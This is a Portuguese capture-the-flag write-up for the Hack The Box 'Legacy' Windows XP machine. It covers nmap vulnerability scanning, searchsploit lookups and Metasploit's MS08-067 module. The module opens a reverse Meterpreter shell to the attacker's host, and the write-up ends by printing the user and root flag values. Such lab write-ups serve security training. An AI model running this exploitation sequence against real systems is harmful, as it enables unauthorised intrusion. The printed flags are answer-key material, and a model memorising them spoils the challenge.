---
title:     "Hack The Box - Legacy"
tags: [windows,easy,smb,CVE-2008-4250]
categories: HackTheBox
---


![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-legacy/1.jpg)


Nós vamos abrir o acesso a partir do Hack The Box.

Link: <https://www.hackthebox.eu/home/machines/profile/2>

Agora, vamos começar a enumeração inicial usando o nmap.
## Nmap Scan Results:

```
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h31m02s, deviation: 2h07m16s, median: 4d23h01m02s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:70:7e (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-06-25T02:06:05+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
```

## NSE Scripts:

Utilizando os scripts NSE do nmap, podemos realizar mais um scan em busca de vulnerabilidades.
```
root@kali:~/HTB-Windows/Legacy# nmap -p139,445 --script vuln 10.10.10.4               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-20 19:17 EDT              
Nmap scan report for 10.10.10.4
Host is up (0.20s latency).  
                                          
PORT    STATE SERVICE                                                                
139/tcp open  netbios-ssn   
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
445/tcp open  microsoft-ds       
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
Host script results:                                                                                                                                                [3/117]
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED                                                                                                                        
| smb-vuln-ms08-067: 
|   VULNERABLE:                                                                      
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
```
## Find Exploits:

De acordo com o resultado do nmap utilizando os scripts em busca de vulns, foi encontrada duas vulnerabilidades **smb-vuln-ms08-067** e **smb-vuln-ms17-010**, com o searchsploit podemos procurar por exploits disponiveis.

searchsploit ms08-067
```
root@kali:~/HTB-Windows/Legacy# searchsploit ms08-067
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)                                                                    | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                                                                                     | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                                                                               | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) (Metasploit)                                                | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)                                                                           | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)                                                                           | windows/remote/7132.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

searchsploit ms17-010
```
root@kali:~/HTB-Windows/Legacy# searchsploit ms17-010
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                           |  Path
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metasploit) (MS17-010)                | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                                                            | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                                         | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                     | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                                               | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)                                            | windows_x86-64/remote/41987.py
----------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## Exploitation smb-vuln-ms08-067:

Tentei outras formas de explorar manualmente sem o uso do MSFCONSOLE, no entanto, tive dificuldades por conta que sempre a maquina dava pau. Depois de muitas tentativas sem sucesso resolvi usar o MSFCONSLE.

Iniciamos nosso MSFCONSOLE.
```
root@kali:~/HTB-Windows# msfconsole                                                                                                                               [697/697]
                                                                                                                                                                           
                                   ___          ____                                                                                                                       
                               ,-""   `.      < HONK >                                                                                                                     
                             ,'  _   e )`-._ /  ----                                                                                                                       
                            /  ,' `-._<.===-'                                                                                                                              
                           /  /                                                                                                                                            
                          /  ;                                                                                                                                             
              _          /   ;                                                                                                                                             
 (`._    _.-"" ""--..__,'    |                                                                                                                                             
 <_  `-""                     \                                                                                                                                            
  <`-                          :                                                                                                                                           
   (__   <__.                  ;                                                                                                                                           
     `-.   '-.__.      _.'    /                                                                                                                                            
        \      `-.__,-'    _,'                                                                                                                                             
         `._    ,    /__,-'                                                                                                                                                
            ""._\__,'< <____                                                                                                                                               
                 | |  `----.`.                                                                                                                                             
                 | |        \ `.                                                                                                                                           
                 ; |___      \-``                                                                                                                                          
                 \   --<                                                                                                                                                   
                  `.`.<                                                                                                                                                    
                    `-'                                                                                                                                                    
                                                                                                                                                                           
                                                                                                                                                                           
                                                                                                                                                                           
       =[ metasploit v5.0.92-dev                          ]                                                                                                                
+ -- --=[ 2026 exploits - 1102 auxiliary - 343 post       ]                                                                                                                
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                                                
+ -- --=[ 7 evasion                                       ]

Metasploit tip: Metasploit can be configured at startup, see msfconsole --help to learn more
```

Depois de iniciado, procuramos por netapi referente a noss vuln encontrada na etapa anteriot.
```
msf5 exploit(windows/smb/ms17_010_psexec) > search netapi

Matching Modules
================

   #  Name                                 Disclosure Date  Rank    Check  Description
   -  ----                                 ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
   1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
   2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
   3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

Selecionamos então o **exploit/windows/smb/ms08_067_netapi** MS08-067 Microsoft Server Service Relative Path Stack Corruption
Lembre-se que essa maquina pode crashar e será preciso reiniciar.
```
msf5 exploit(windows/smb/ms17_010_psexec) > use exploit/windows/smb/ms08_067_netapi
msf5 exploit(windows/smb/ms08_067_netapi) > show options 

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

Veja alguns erros que eu tive
```
msf5 exploit(windows/smb/ms08_067_netapi) > set rhosts 10.10.10.4
rhosts => 10.10.10.4
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/ms08_067_netapi) > set verbose true
verbose => true
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[-] 10.10.10.4:445 - Exploit failed [unreachable]: Rex::ConnectionTimeout The connection timed out (10.10.10.4:445).
[*] Exploit completed, but no session was created.
msf5 exploit(windows/smb/ms08_067_netapi) > ping 10.10.10.4
[*] exec: ping 10.10.10.4

PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=203 ms
64 bytes from 10.10.10.4: icmp_seq=2 ttl=127 time=211 ms
64 bytes from 10.10.10.4: icmp_seq=3 ttl=127 time=244 ms
```

Depois de ter reiniciado a maquina executamos o exploit novamente.
```
msf5 exploit(windows/smb/ms08_067_netapi) > run

[*] Started reverse TCP handler on 10.10.14.36:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:Unknown
[*] 10.10.10.4:445 - We could not detect the language pack, defaulting to English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (176195 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.36:4444 -> 10.10.10.4:1032) at 2020-06-20 13:50:34 -0400

meterpreter > shell
Process 1840 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
```

## Search FLAG user e root

Retornamos a nossa sessão do meterpreter e usando o **search -f** encontramos rápidamente as flags.
```
Terminate channel 1? [y/N]  y
meterpreter > search -f root.txt
Found 1 result...
    c:\Documents and Settings\Administrator\Desktop\root.txt (32 bytes)
meterpreter > search -f user.txt
Found 1 result...
    c:\Documents and Settings\john\Desktop\user.txt (32 bytes)
```

Agora podemos ler e submeter na plataforma

```
meterpreter > shell
Process 1552 created.
Channel 2 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>type "c:\Documents and Settings\Administrator\Desktop\root.txt"
type "c:\Documents and Settings\Administrator\Desktop\root.txt"
993442d258b0e0ec917cae9e695d5713
C:\WINDOWS\system32>type "c:\Documents and Settings\john\Desktop\user.txt"
type "c:\Documents and Settings\john\Desktop\user.txt"
e69af0e4f443de7e36876fda4ec7644f
C:\WINDOWS\system32>
```
